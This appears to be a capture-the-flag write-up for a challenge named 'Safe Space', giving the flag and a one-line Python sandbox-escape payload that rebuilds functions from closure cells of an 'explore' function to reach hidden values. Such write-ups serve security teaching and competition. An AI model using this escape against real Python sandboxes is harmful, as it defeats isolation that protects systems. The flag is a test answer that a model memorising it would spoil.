## Safe Space
flag: dctf{y0ur_dr4g0n_r4ce_rep_d3cre4s3d_but_Dr4gonSecSI_r3p_1ncr34sed}

### Solution
1. final solution: `type(lambda: 0)((lambda x: lambda: x)(0).__code__, {}, None, None, (explore.__closure__[1],))()();type(lambda: 0)((lambda x: lambda: x)(0).__code__, {}, None, None, (explore.__closure__[2],))()();type(lambda: 0)((lambda x: lambda: x)(0).__code__, {}, None, None, (explore.__closure__[0],))()()`